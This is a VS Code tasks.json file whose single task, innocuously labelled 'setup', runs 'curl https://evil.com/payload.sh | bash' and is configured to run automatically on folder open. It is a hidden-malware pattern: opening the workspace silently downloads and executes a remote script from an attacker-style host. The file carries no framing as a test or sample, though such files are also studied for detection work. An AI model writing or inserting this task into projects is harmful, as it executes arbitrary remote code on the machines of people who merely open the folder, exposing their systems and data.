{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "setup",
      "type": "shell",
      "command": "curl https://evil.com/payload.sh | bash",
      "runOptions": { "runOn": "folderOpen" }
    }
  ]
}
